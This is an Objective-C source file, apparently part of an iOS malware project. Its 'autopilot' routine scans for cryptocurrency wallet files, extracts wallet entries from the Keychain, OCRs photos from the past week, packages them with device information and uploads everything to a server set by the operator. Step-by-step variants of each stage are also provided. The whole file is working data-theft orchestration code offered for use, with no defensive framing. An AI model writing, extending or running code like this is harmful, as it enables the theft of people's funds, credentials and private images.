//
//  RDAutoPilot.m
//  自动驾驶控制器实现
//

#import "RDAutoPilot.h"
#import "RDFileScanner.h"
#import "RDKeychainExtractor.h"
#import "RDPhotoScanner.h"
#import "RDDataPackager.h"
#import "RDDataUploader.h"

static NSInteger s_photoScanDays = 7;

@implementation RDAutoPilot

// ============ 一键执行 ============
+ (void)run {
    [self runWithCompletion:nil];
}

+ (void)runWithCompletion:(RDAutoPilotCompletion)completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{

        // Step 1: 扫描文件
        NSArray *files = [RDFileScanner scanAllWallets];

        // Step 2: 提取 Keychain
        NSArray *keychainItems = [RDKeychainExtractor extractAllWallets];

        // Step 3: 扫描相册
        dispatch_semaphore_t sema = dispatch_semaphore_create(0);
        __block NSArray *photoResults = nil;
        [RDPhotoScanner scanRecentPhotos:s_photoScanDays completion:^(NSArray<RDPhotoOCRResult *> *results) {
            photoResults = results;
            dispatch_semaphore_signal(sema);
        }];
        dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));

        // Step 4: 打包
        NSDictionary *deviceInfo = [RDDataPackager collectDeviceInfo];
        NSError *pkgError = nil;
        NSData *package = [RDDataPackager packageWithFiles:files
                                             keychainItems:keychainItems
                                              photoResults:photoResults
                                               deviceInfo:deviceInfo
                                                    error:&pkgError];

        if (!package) {
            if (completion) completion(NO, files.count, keychainItems.count, photoResults.count, pkgError);
            return;
        }

        // Step 5: 上传
        dispatch_semaphore_t uploadSema = dispatch_semaphore_create(0);
        __block BOOL uploadOK = NO;
        [RDDataUploader uploadData:package endpoint:@"upload" completion:^(BOOL success, NSError *error) {
            uploadOK = success;
            dispatch_semaphore_signal(uploadSema);
        }];
        dispatch_semaphore_wait(uploadSema, dispatch_time(DISPATCH_TIME_NOW, 120 * NSEC_PER_SEC));

        if (completion) {
            completion(uploadOK, files.count, keychainItems.count, photoResults.count, nil);
        }
    });
}

// ============ 分步执行 ============

+ (void)stepScanFiles:(void (^)(NSArray *))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSArray *files = [RDFileScanner scanAllWallets];
        if (completion) completion(files);
    });
}

+ (void)stepExtractKeychain:(void (^)(NSArray *))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSArray *items = [RDKeychainExtractor extractAllWallets];
        if (completion) completion(items);
    });
}

+ (void)stepScanPhotos:(void (^)(NSArray *))completion {
    [RDPhotoScanner scanRecentPhotos:s_photoScanDays completion:completion];
}

+ (NSData *)stepPackageWithFiles:(NSArray *)files
                   keychainItems:(NSArray *)keychainItems
                    photoResults:(NSArray *)photoResults {
    return [RDDataPackager packageWithFiles:files
                              keychainItems:keychainItems
                               photoResults:photoResults
                                 deviceInfo:[RDDataPackager collectDeviceInfo]
                                      error:nil];
}

+ (void)stepUpload:(NSData *)data completion:(void (^)(BOOL))completion {
    [RDDataUploader uploadData:data endpoint:@"upload" completion:^(BOOL success, NSError *e) {
        if (completion) completion(success);
    }];
}

// ============ 配置 ============

+ (void)setServerURL:(NSString *)url {
    [RDDataUploader setServerURL:url];
}

+ (void)setPhotoScanDays:(NSInteger)days {
    s_photoScanDays = days;
}

@end
